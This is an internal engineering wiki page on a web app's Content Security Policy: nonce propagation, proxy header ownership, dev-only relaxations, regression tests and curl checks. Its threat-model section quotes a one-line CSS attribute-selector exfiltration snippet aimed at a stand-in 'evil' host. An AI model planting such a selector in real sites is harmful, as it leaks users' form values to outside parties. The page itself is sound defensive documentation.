---
title: "CSP — Content Security Policy"
tags: [security, csp, traefik, nonce, next-themes, xss, infrastructure]
last-updated: 2026-05-17
related: ["[[Auth]]", "[[Domains]]", "[[Docker]]"]
date: "2026-07-15"
updated: "2026-07-15"
category: "wiki/concepts"
---

# CSP — Content Security Policy

## Current architecture (post Phase 4B)

- **App is the SOLE owner of `Content-Security-Policy`** — `apps/experts-app/proxy.ts` emits the full CSP (all 13 directives) with a per-request nonce on `script-src`.
- **Traefik does NOT set `Content-Security-Policy`** — `headers.contentSecurityPolicy` removed from `secure-headers@file` middleware as of 2026-05-17 (incident #10 Phase 4B).
- App emits BOTH `Content-Security-Policy` (enforcing) and `Content-Security-Policy-Report-Only` (telemetry redundancy) with the same policy.
- Violations report to `/api/v1/internal/csp-report` (PR #316). The receiver accepts both legacy `application/csp-report` and modern `application/reports+json` shapes, rate-limited per-IP, fail-open on Redis blip.
- Nonces flow: `proxy.ts` generates → propagates via `x-csp-nonce` request header → `app/layout.tsx` reads via `headers()` → injects as `<meta name="csp-nonce" content="...">` AND as `nonce={...}` on `<GoogleAnalytics>` / `<Script>` (ELU) / next-themes top-level `nonce` prop / `<JsonLd>` server component / client-side `readCspNonce()` in `tabby-promo.tsx`.

## Hard-earned architectural rules

### 1. Traefik `headers.contentSecurityPolicy` is a SET operation, not ADD

> Stock Traefik `secure-headers` middleware **overwrites** the `Content-Security-Policy` header coming from upstream. Whatever the app sets is silently dropped before reaching the browser. The `Content-Security-Policy-Report-Only` header is unaffected because Traefik doesn't manage that header name.

**Implication:** for per-request nonce CSP to work, Traefik must NOT set `headers.contentSecurityPolicy` at all. There's no partial / split-ownership option without writing a custom Traefik plugin. Verified empirically in PR #323 (dual-header attempt) — the app's enforcing CSP had zero observable effect until Traefik dropped its CSP entirely.

### 2. next-themes `scriptProps.nonce` is silently ignored

> `next-themes` ≥ 0.4 has BOTH a top-level `nonce` prop AND a `scriptProps` prop. The injected pre-hydration `<script>` reads nonce **only** from the top-level prop. Internally it does `React.createElement("script", { ...scriptProps, nonce: typeof window === "undefined" ? topLevelNonce : "", ... })` — the hardcoded `nonce: topLevelNonce` line clobbers anything in `scriptProps`.

**Correct usage:**

```tsx
<ThemeProvider
  nonce={cspNonce}                          // ✓ this is the one that matters
  scriptProps={{suppressHydrationWarning: true}}
>
```

**Wrong usage** (silently does nothing):

```tsx
<ThemeProvider
  scriptProps={{suppressHydrationWarning: true, nonce: cspNonce}}  // ✗ ignored
>
```

### 3. Phase 4 deployment ordering

App deploys FIRST, then Traefik drops its CSP. Reverse breaks production:

- **Wrong:** drop Traefik CSP first → app not yet emitting CSP → window with NO enforcement at all
- **Right:** deploy app with `proxy.ts` CSP → Traefik still overwrites (no behavior change) → ops drops Traefik CSP → app CSP becomes the live policy

### 4. CSP is environment-aware — dev gets `'unsafe-eval'` + dev WS, prod does not

> Production runs `next start` under `NODE_ENV=production`; staging is built the same way. Both must NEVER carry `'unsafe-eval'` in `script-src` or any `ws://localhost` / `ws://<private-IP>` source in `connect-src`. **Development** (`pnpm dev`, vitest under `NODE_ENV=test`) needs `'unsafe-eval'` for React DevTools, the error overlay, source-map reconstruction, and Zod v4 schema introspection — all of which use `eval()` / `new Function()` only in dev.

**Where this lives:** `apps/experts-app/proxy.ts` has a `DEV_ONLY_CSP_ADDITIONS` map and a `resolveCspSources()` helper that conditionally extends each directive only when `process.env.NODE_ENV !== "production"`. `buildAppCsp(nonce)` is exported solely so the regression test can call it under different `NODE_ENV` values.

**Hard rule:** never add a dev-only source directly to the static `CSP_DIRECTIVES` constant. Put it in `DEV_ONLY_CSP_ADDITIONS` — otherwise it leaks to production CSP indefinitely. Caught historically: `http://localhost:3025` in `script-src` and four `ws://` entries in `connect-src` were silently shipping to prod until incident #14.

**Regression guard:** `apps/experts-app/__tests__/csp-environment.test.ts` — 4 production-LOCKED assertions (no `'unsafe-eval'`, no localhost, no private IPs, nonces + required third parties present), 2 dev assertions, 1 test-env assertion. Any future refactor that leaks dev relaxations to prod fails CI.

**Truth-test in either environment:**

```bash
# Dev (expect 'unsafe-eval' PRESENT)
curl -sI http://localhost:3025/en | grep -oE "script-src [^;]+"

# Prod (expect 'unsafe-eval' ABSENT)
curl -sI https://app.experts.com.sa/en | grep -oE "script-src [^;]+"
```

### 5. style-src `'unsafe-inline'` is accepted residual risk

`style-src 'unsafe-inline'` remains in the live CSP. Migration paths considered (per-rule nonce, `'unsafe-hashes'`, separate stylesheet) all have prohibitive cost or library incompatibility (HeroUI, Tailwind v4 runtime, emotion, framer-motion all emit inline `style="..."` attributes).

Threat model for `style-src 'unsafe-inline'` is narrow:

- Not XSS (inline styles can't execute JS)
- CSS-attribute-selector data exfiltration (`input[value^="a"] { background: url(evil); }`) — mitigated in practice by `img-src 'self' data: blob: https://cdn.experts.com.sa ...` (no arbitrary external image fetches)
- Not credential compromise

**Revisit only** if a specific threat model demands it (regulator-driven hardening, breach-disclosure-driven policy revision).

## Empirical truth-test

A 5-second check that tells you who's actually controlling CSP:

```bash
curl -sLI https://app.experts.com.sa/en \
  | grep -ic '^content-security-policy:'
```

- `1` = healthy, one source owns CSP (currently: the app)
- `2` = double-set (Traefik + app both setting it) — browser intersects; restrictive but workable; likely a Traefik regression
- `0` = catastrophic gap — no enforcement at all; rollback NOW

For the deep check:

```bash
# Does the live CSP have nonce-based script-src?
curl -sLI https://app.experts.com.sa/en \
  | grep -i '^content-security-policy:' \
  | grep -oE "script-src [^;]+"
```

Expected output:

```
script-src 'self' 'nonce-<base64>' https://elu.dev https://static.cloudflareinsights.com https://www.googletagmanager.com https://us-assets.i.posthog.com
```

Critical: NO `'unsafe-inline'` on `script-src`. If you see `'unsafe-inline'` here, the nonce mitigation is defeated (because `'unsafe-inline'` lets ANY inline script through — defeating the whole nonce model).

## Where CSP code lives

- `apps/experts-app/proxy.ts` — `CSP_DIRECTIVES` constant + `buildAppCsp(nonce)` + `applyCspNonce(...)` + per-request nonce generation
- `apps/experts-app/app/layout.tsx` — reads nonce from `headers()`, exposes via `<meta name="csp-nonce">` + nonce props on third-party `<Script>` components and next-themes
- `apps/experts-app/src/components/json-ld.tsx` — async server component, reads nonce from `headers()`, renders nonced `<script type="application/ld+json">`
- `apps/experts-app/src/components/payments/tabby-promo.tsx` — `readCspNonce()` reads from `<meta name="csp-nonce">` and attaches to dynamically-created `<script>`
- `apps/experts-app/app/api/v1/internal/csp-report/route.ts` — violation receiver (legacy + modern formats, rate-limited, fail-open)

## Cross-references

- [Incident #10 — CSP nonce migration](Raw/reviews/incident%2310/security-14052026.md)
- [Incident #13 — host-header injection in share pages](Raw/reviews/incident%2313/security-17052026.md) (carved out of #10 investigation)
- PR #316 (CSP report endpoint)
- PR #321 (Phase 2+3 — nonce + Report-Only)
- PR #322 (Phase 3 follow-up — next-themes nonce)
- PR #323 (Phase 4A attempt — superseded, demonstrates the Traefik-overwrites lesson)
- PR #324 (Phase 4B — app takes full CSP ownership, current production state)
